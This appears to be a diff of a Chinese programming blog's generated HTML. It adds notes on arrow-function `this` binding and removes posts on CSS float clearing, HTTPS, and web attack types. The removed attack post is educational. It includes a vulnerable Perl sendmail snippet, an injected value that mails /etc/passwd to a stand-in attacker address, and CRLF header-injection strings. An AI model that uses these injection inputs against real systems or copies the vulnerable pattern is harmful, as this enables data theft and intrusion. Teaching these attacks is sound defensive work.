+<h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><p>众所周知，ES6 的箭头函数是可以避免 ES5 中使用 this 的坑的。<strong>箭头函数的 this 始终指向函数定义时的 this，而非执行时。</strong>箭头函数需要记着这句话：<strong>“箭头函数中没有 this 绑定，必须通过查找作用域链来决定其值，如果箭头函数被非箭头函数包含，则 this 绑定的是最近一层非箭头函数的 this，否则，this 为 undefined”</strong>。<strong>箭头函数的绑定无法被修改，new也不可以</strong></p>
 <p>例 8 ：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line"></span><br><span class="line">var a = &#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line"></span><br><span class="line">    func1: function () &#123;</span><br><span class="line">        console.log(this.name)     </span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    func2: function () &#123;</span><br><span class="line">        setTimeout( () =&gt; &#123;</span><br><span class="line">            this.func1()</span><br><span class="line">        &#125;,100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.func2()     // Cherry复制代码</span><br></pre></td></tr></table></figure>
 
@@ -935,411 +1208,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://coloey.github.io/2022/04/13/%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-93091834844364ab73fd617db4685210_720w.jpg?source=1940ef5c">
-      <meta itemprop="name" content="小柒">
-      <meta itemprop="description" content="欢迎来到我的世界!">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小柒">
-    </span>
-      <header class="post-header">
-
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/13/%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8/" class="post-title-link" itemprop="url">清除浮动</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-04-13 09:36:28 / 修改时间：11:36:27" itemprop="dateCreated datePublished" datetime="2022-04-13T09:36:28+08:00">2022-04-13</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CSS/" itemprop="url" rel="index"><span itemprop="name">CSS</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="为什么需要清除浮动"><a href="#为什么需要清除浮动" class="headerlink" title="为什么需要清除浮动"></a>为什么需要清除浮动</h1><p>由于父级盒子很多情况下，不方便给高度，当时盒子浮动又不占有位置，最后父级盒子高度为 0 时，就会影响下面的盒子，对后面元素排版产生影响。</p>
-<h1 id="清除浮动本质"><a href="#清除浮动本质" class="headerlink" title="清除浮动本质"></a>清除浮动本质</h1><ul>
-<li>清除浮动的本质是清除浮动元素造成的影响</li>
-<li>如果父盒子本身具有高度，则不需要清除浮动</li>
-<li>清除浮动之后，父级会根据浮动的子盒子自动检测高度，父级有了高度，就不会影响下面的标准流了</li>
-</ul>
-<p>语法：</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">选择器: &#123;</span><br><span class="line">  clear: 属性值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>属性值</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>left</td>
-<td>不允许左侧有浮动元素</td>
-</tr>
-<tr>
-<td>right</td>
-<td>不允许右侧有浮动元素</td>
-</tr>
-<tr>
-<td>both</td>
-<td>同时清除左右两侧浮动</td>
-</tr>
-</tbody></table>
-<p>清除浮动策略：闭合浮动</p>
-<h1 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h1><ol>
-<li><strong>额外标签法（隔墙法）</strong>，是 W3C 推荐的方法</li>
-<li>父级添加 overflow 属性</li>
-<li>父级添加 after 伪元素</li>
-<li>父级添加双伪元素</li>
-</ol>
-<h2 id="额外标签法"><a href="#额外标签法" class="headerlink" title="额外标签法"></a>额外标签法</h2><p>也称为隔墙法，是 W3C 推荐的方法。</p>
-<p>额外标签法是在最后一个浮动元素末尾添加一个 <strong>空块级元素</strong>（<strong>不能是行内元素</strong>），给其赋以属性 <code>clear:both;</code>。</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">  <span class="attribute">clear</span>: both;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;clear&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>Copy to clipboardErrorCopied</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>优点：通俗易懂，书写方便</li>
-<li>缺点：添加许多无意义的标签，结构化差</li>
-</ul>
-<p>总结</p>
-<ol>
-<li><p>清除浮动的本质</p>
-<p>清除浮动的本质是清除浮动元素脱离标准流造成的影响</p>
-</li>
-<li><p>清除浮动的策略</p>
-<p><strong>闭合浮动</strong>，只让浮动在父盒子内部影响，不影响父盒子外面的其他盒子。</p>
-</li>
-<li><p>使用场景</p>
-<p>实际开发中可能会遇到，但是不常用。</p>
-</li>
-</ol>
-<h2 id="父级添加-overflow-属性"><a href="#父级添加-overflow-属性" class="headerlink" title="父级添加 overflow 属性"></a>父级添加 <code>overflow</code> 属性</h2><p>可以给父级添加 <code>overflow</code> 属性，将其属性设置为 <code>hidden</code>、<code>auto</code>或<code>scroll</code>。</p>
-<p>注意是给父元素添加代码：</p>
-<ul>
-<li>优点：代码简洁</li>
-<li>缺点：无法显示溢出部分</li>
-</ul>
-<h2 id="父级添加-after-伪元素"><a href="#父级添加-after-伪元素" class="headerlink" title="父级添加 after 伪元素"></a>父级添加 after 伪元素</h2><p>实际上也是额外标签法的一种。（相当于在最后一个子元素后面再添加一个元素隔开）</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;//伪元素为行内块元素，要转换为块级元素</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">  <span class="attribute">visibility</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span> &#123;</span><br><span class="line">  <span class="comment">/*IE6、7专有*/</span></span><br><span class="line">  *zoom: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="父级添加双伪元素"><a href="#父级添加双伪元素" class="headerlink" title="父级添加双伪元素"></a>父级添加双伪元素</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;//前后都隔开</span><br><span class="line">  <span class="attribute">display</span>: table;//伪元素为行内块元素，要转换为块级元素</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span> &#123;</span><br><span class="line">  *zoom: <span class="number">1</span>;</span><br><span class="line">&#125;Copy <span class="selector-tag">to</span> clipboardErrorCopied</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>优点：代码更简洁</li>
-<li>缺点：照顾低版本浏览器</li>
-<li>代表网站：小米、腾讯</li>
-</ul>
-<p>伪元素转化为块级元素原因：根本原因是为了解决<strong>clearfix内部非浮动元素margin塌陷问题</strong>。</p>
-<p>另发现一个新属性<strong>display: flow-root</strong>，不支持Safari。它可以创建无副作用的BFC。在父级块中使用 display: flow-root 可以创建新的BFC。其作用和clearfix一致。</p>
-<p>参考：</p>
-<h1 id="为什么需要清除浮动？"><a href="#为什么需要清除浮动？" class="headerlink" title="为什么需要清除浮动？"></a>为什么需要清除浮动？</h1><ol>
-<li>父级没高度</li>
-<li>子盒子浮动了</li>
-<li>影响下面布局了，应该清除浮动。</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://coloey.github.io/2022/04/12/HTTPS/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-93091834844364ab73fd617db4685210_720w.jpg?source=1940ef5c">
-      <meta itemprop="name" content="小柒">
-      <meta itemprop="description" content="欢迎来到我的世界!">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小柒">
-    </span>
-      <header class="post-header">
-
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/12/HTTPS/" class="post-title-link" itemprop="url">HTTPS</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-12 22:02:46" itemprop="dateCreated datePublished" datetime="2022-04-12T22:02:46+08:00">2022-04-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-05-01 16:16:39" itemprop="dateModified" datetime="2022-05-01T16:16:39+08:00">2022-05-01</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/http/" itemprop="url" rel="index"><span itemprop="name">http</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="HTTP-加密-认证-完整性保护-HTTPS"><a href="#HTTP-加密-认证-完整性保护-HTTPS" class="headerlink" title="HTTP+加密+认证+完整性保护=HTTPS"></a>HTTP+加密+认证+完整性保护=HTTPS</h1><p>HTTPS是HTTP通信接口部分用SSL和TLS协议代替。</p>
-<p><img src="/2022/04/12/HTTPS/image-20220412220554428-16513925288481.png" alt="1"></p>
-<p>SSL是独立于HTTP的协议</p>
-<h1 id="相互交换密钥的公开密钥加密技术"><a href="#相互交换密钥的公开密钥加密技术" class="headerlink" title="相互交换密钥的公开密钥加密技术"></a>相互交换密钥的公开密钥加密技术</h1><h2 id="共享密钥加密"><a href="#共享密钥加密" class="headerlink" title="共享密钥加密"></a>共享密钥加密</h2><p>加密和解密用一个密钥的方式，也叫做对称密钥加密</p>
-<p><img src="/2022/04/12/HTTPS/image-20220412220843669-16513925415952.png" alt="2"></p>
-<h2 id="使用两把密钥的公开密钥加密"><a href="#使用两把密钥的公开密钥加密" class="headerlink" title="使用两把密钥的公开密钥加密"></a>使用两把密钥的公开密钥加密</h2><p>使用非对称的密钥，一把叫做私有密钥，另一把叫做公有密钥，私有密钥不能让任何人知道，公有密钥可以随意发布。</p>
-<p>发送密文的一方使用对方的公开密钥进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密，解密过程是队离散对数的求值。</p>
-<h2 id="HTTPS采用混合加密机制"><a href="#HTTPS采用混合加密机制" class="headerlink" title="HTTPS采用混合加密机制"></a>HTTPS采用混合加密机制</h2><p><img src="/2022/04/12/HTTPS/image-20220412221342675-16513925550753.png"></p>
-<h2 id="证明公开密钥正确性的证书"><a href="#证明公开密钥正确性的证书" class="headerlink" title="证明公开密钥正确性的证书"></a>证明公开密钥正确性的证书</h2><p><img src="/2022/04/12/HTTPS/image-20220412221707589-16513925700274.png"></p>
-<h1 id="HTTPS的安全通信机制"><a href="#HTTPS的安全通信机制" class="headerlink" title="HTTPS的安全通信机制"></a>HTTPS的安全通信机制</h1><p><img src="/2022/04/12/HTTPS/image-20220412221846408-16513925836595.png"></p>
-<ol>
-<li>客户端通过发送Client Hello报文开始SSL通信，报文中包含客户端支持的SSL的指定版本，加密组件列表</li>
-<li>服务器可进行SSL通信时，会以Server Hello报文作为应答，和客户端一样，在报文中包含SSL版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的</li>
-<li>之后服务器发送Certificate报文，报文中包含公开密钥证书</li>
-<li>最后服务器发送Server Hello Done 报告通知客户端，最初阶段的SSL握手协商部分结束</li>
-<li>SSL第一次握手结束后，客户端以Client Key Exchange报文作为回应，报文中包含通信加密中使用的一种被称为Pre-master secret的随机密码串，该报文已用步骤3中的公开密钥进行加密</li>
-<li>接着客户端继续发送Change Cipher Spec报文，该报文会提示服务器，在此报文之后的通信会采用Pre-master secret密钥加密</li>
-<li>客户端发送Finished报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否正确解密该报文作为判定标准</li>
-<li>服务器同样发送Change Cipher Spec报文</li>
-<li>服务器同样发送Finished报文</li>
-<li>服务端和客户端的Finished报文交换完毕后，SSL连接就建立完成。通信会受到SSL保护，从此开始进行应用层协议通信，即发送HTTP请求</li>
-</ol>
-<p><img src="/2022/04/12/HTTPS/image-20220412222929047-16513926018216.png"></p>
-<h2 id="SSL缺点："><a href="#SSL缺点：" class="headerlink" title="SSL缺点："></a>SSL缺点：</h2><ul>
-<li>通信慢</li>
-<li>大量消耗CPU及内存资源，导致处理速度慢</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://coloey.github.io/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-93091834844364ab73fd617db4685210_720w.jpg?source=1940ef5c">
-      <meta itemprop="name" content="小柒">
-      <meta itemprop="description" content="欢迎来到我的世界!">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小柒">
-    </span>
-      <header class="post-header">
-
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">针对Web的攻击技术</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-12 18:09:24" itemprop="dateCreated datePublished" datetime="2022-04-12T18:09:24+08:00">2022-04-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-05-01 16:16:50" itemprop="dateModified" datetime="2022-05-01T16:16:50+08:00">2022-05-01</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/http/" itemprop="url" rel="index"><span itemprop="name">http</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="针对Web应用的攻击模式"><a href="#针对Web应用的攻击模式" class="headerlink" title="针对Web应用的攻击模式"></a>针对Web应用的攻击模式</h1><ul>
-<li>主动攻击</li>
-<li>被动攻击</li>
-</ul>
-<h2 id="以服务器为目标的主动攻击"><a href="#以服务器为目标的主动攻击" class="headerlink" title="以服务器为目标的主动攻击"></a>以服务器为目标的主动攻击</h2><p>指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式，由于该模式是直接针对服务器的资源进行攻击的，因此攻击者需要能访问到那些资源，主动攻击模式里具有代表性的攻击时SQL注入攻击和OS命令注入攻击</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412181613054-16513926747841.png"></p>
-<h2 id="以服务器为目标的被动攻击"><a href="#以服务器为目标的被动攻击" class="headerlink" title="以服务器为目标的被动攻击"></a>以服务器为目标的被动攻击</h2><p>被动攻击利用圈套策略执行攻击代码的攻击模式。攻击者不直接对目标Web应用访问攻击</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412182127382-16513926974562.png"></p>
-<h2 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h2><p>是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击，动态创建的HTML部分可能隐藏着安全漏洞，就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，就会受到被动攻击</p>
-<h3 id="跨站脚本攻击可能造成的影响"><a href="#跨站脚本攻击可能造成的影响" class="headerlink" title="跨站脚本攻击可能造成的影响"></a>跨站脚本攻击可能造成的影响</h3><ul>
-<li>利用虚假输入的表单骗取用户个人信息</li>
-<li>利用脚本窃取用户的COOkie值，被害者在不知情的情况下帮助攻击者发送请求</li>
-<li>显示伪造的文章或图片</li>
-</ul>
-<p>eg:</p>
-<p>在网站地址朗中URI测查询字段ID即相当于在表单内自动填写字符串的功能，写入：</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412183440243-16513927094233.png"></p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412183528509-16513927234744.png"></p>
-<h3 id="对用户Cookie的窃取"><a href="#对用户Cookie的窃取" class="headerlink" title="对用户Cookie的窃取"></a>对用户Cookie的窃取</h3><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412183650899-16497598258515.png"></p>
-<h2 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h2><p>会执行非法SQL的SQL注入攻击</p>
-<h3 id="造成影响："><a href="#造成影响：" class="headerlink" title="造成影响："></a>造成影响：</h3><ul>
-<li>非法查看或篡改数据库内的数据</li>
-<li>规避认证</li>
-<li>执行和数据库服务业务关联的程序等</li>
-</ul>
-<p>eg:</p>
-<p>某购物网站可将坐着名字作为搜索关键字查找他的所有著作</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412200225045-16497649612096.png"></p>
-<p>结果跟flag=1的设定值无关，只取出author=”上野宣”，这样未出版的书籍也一并显示</p>
-<h2 id="OS命令注入攻击"><a href="#OS命令注入攻击" class="headerlink" title="OS命令注入攻击"></a>OS命令注入攻击</h2><p>指通过Web应用，执行非法的操作系统命令达到攻击的目的，只要在能调用Shell函数的地方就有存在被攻击的风险。</p>
-<p>可以从Web应用中通过Shell来调用操作系统命令，倘若调用Shell时存在疏漏，就可以执行非法的OS命令。OS命令注入攻击可以向Shell发送命令，让Windows或Linux操作系统的命令行启动程序。</p>
-<p>eg:</p>
-<p>咨询表单的发送功能，将用户的咨询邮件按已填写对方的邮箱地址发送过去。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my $adr= $q-&gt;param(&#x27;mailaddress&#x27;);</span><br><span class="line">open(MAIL,&quot;| /usr/sbin/sendmail $adr&quot;);</span><br><span class="line">print MAIL &quot;FROM :info@example.com\n&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>程序中的open函数会调用sendmail命令发送邮件，而制定邮件发送地址是$adr，攻击者把下面的值制定为邮件地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat /etc/passwd |mail hack@example.jp</span><br></pre></td></tr></table></figure>
-
-<p>程序接收到该值后构成以下组合：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(MAIL,&quot;| /usr/sbin/sendmail;cat /etc/passwd | mail hack@example.jp</span><br></pre></td></tr></table></figure>
-
-<p>“;”在OS命令中会被解析为分割多个执行命令的标记，因此sendmail会将含有Linux账户信息/etc/passwd的文件以邮件形式发送给<a href="mailto:&#x68;&#97;&#99;&#107;&#x40;&#101;&#120;&#97;&#109;&#x70;&#x6c;&#x65;&#46;&#x6a;&#112;">&#x68;&#97;&#99;&#107;&#x40;&#101;&#120;&#97;&#109;&#x70;&#x6c;&#x65;&#46;&#x6a;&#112;</a>。</p>
-<h2 id="HTTP首部注入攻击"><a href="#HTTP首部注入攻击" class="headerlink" title="HTTP首部注入攻击"></a>HTTP首部注入攻击</h2><p>值攻击者通过在响应首部字段内插入换行，添加任意响应首部或主题的一种攻击，属于被动攻击模式。向首部主题内添加内容的攻击称为HTTP响应阶段攻击。</p>
-<p>HTTP首部注入攻击有可能会造成以下影响：</p>
-<ul>
-<li>设置任何Cookie信息</li>
-<li>重定向至任意URL</li>
-<li>显示任意的主体（HTTP响应阶段攻击）</li>
-</ul>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412204121818-16497673045847.png"></p>
-<p>此刻，Set-Cookie生效，攻击者可指定修改任意Cookie信息，通过和绘画固定攻击组合，攻击者可伪装成用户</p>
-<p>攻击者输入%0D%0A变成换行符，结果插入了新的首部字段。</p>
-<h2 id="HTTP响应截断攻击"><a href="#HTTP响应截断攻击" class="headerlink" title="HTTP响应截断攻击"></a>HTTP响应截断攻击</h2><p>HTTP响应截断攻击是用在HTTP首部注入的一种攻击，攻击顺序相同，但是要将两个%0D%0A%0D%0A并排插入字符串后发送，利用这两个连续的换行可作出HTTP首部和主体分割所需的空行，这样就能显示伪造的主体，达到攻击目的。</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412204611730-16497675880148.png"></p>
-<p>利这种攻击，已触发陷阱的用户浏览器会显示伪造的WEB页面，再让用户输入自己的个人信息，达到和XSS攻击相同效果</p>
-<h2 id="邮件首部注入攻击"><a href="#邮件首部注入攻击" class="headerlink" title="邮件首部注入攻击"></a>邮件首部注入攻击</h2><p>攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击。利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件。<br>邮件地址：<br>%0D%0A 代表一个换行符，可以实现邮件地址的追加</p>
-<p>%0D%0A%0D%0A代表两个连续的换行符，可以篡改邮件文本内容</p>
-<h2 id="目录遍历攻击："><a href="#目录遍历攻击：" class="headerlink" title="目录遍历攻击："></a>目录遍历攻击：</h2><p>对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击<br>用户可使用．…/等相对路径定位到/etc/passed等绝对路径上<br>例：</p>
-<h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。<br>例：<img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412210605745-16497687833709.png"></p>
-<h2 id="开放重定向"><a href="#开放重定向" class="headerlink" title="开放重定向"></a>开放重定向</h2><p>是指对指定的任意URL左重定向跳转功能，而与此功能先关联的安全漏洞是指，加入指定的重定向URL到某个具有恶意的Web网站，那么用户就会被诱导到那个网站，有可能被攻击者选中并作为钓鱼攻击的跳板</p>
-<h2 id="因会话管理疏忽引发漏洞"><a href="#因会话管理疏忽引发漏洞" class="headerlink" title="因会话管理疏忽引发漏洞"></a>因会话管理疏忽引发漏洞</h2><p>会话劫持：攻击者通过某种手段拿到用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击目的。</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412213958720-164977081222410.png">会话</p>
-<h2 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h2><p>对以窃取目标会话ID为主动攻击手段的会话劫持，会话固定攻击会强制用户使用攻击者指定额会话ID</p>
-<p>例子：</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412214406544-164977106060411.png"></p>
-<h2 id="跨站点请求伪造（CSRF）"><a href="#跨站点请求伪造（CSRF）" class="headerlink" title="跨站点请求伪造（CSRF）"></a>跨站点请求伪造（CSRF）</h2><p>是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。</p>
-<h3 id="可能造成的影响："><a href="#可能造成的影响：" class="headerlink" title="可能造成的影响："></a>可能造成的影响：</h3><ul>
-<li>利用已通过认证的用户权限更新设定信息等</li>
-<li>利用已通过认证的用户权限购买商品</li>
-<li>利用已通过认证的用户权限在留言板发表言论</li>
-</ul>
-<p>例子：</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412215236611-164977157123012.png"></p>
-<h2 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h2><p>是一种让运行中的服务呈停止状态的攻击，有时也叫停止攻击或拒绝服务攻击，DoS攻击的对象不仅限于Web网站，还包括网络设备及服务器。</p>
-<h3 id="主要有两种DOS攻击方式："><a href="#主要有两种DOS攻击方式：" class="headerlink" title="主要有两种DOS攻击方式："></a>主要有两种DOS攻击方式：</h3><ul>
-<li>集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈现停止状态。</li>
-<li>通过攻击安全漏洞使服务停止</li>
-</ul>
-<p>集中利用访问请求，就是发送大量的合法请求，服务器很难分辨何为正常请求，何为攻击请求，因此很难防止DOS攻击。</p>
-<p>多台计算机发起的DOS攻击称为DDOS攻击，DDOS攻击通常利用那些感染病毒的极端及作为攻击者的攻击跳板</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
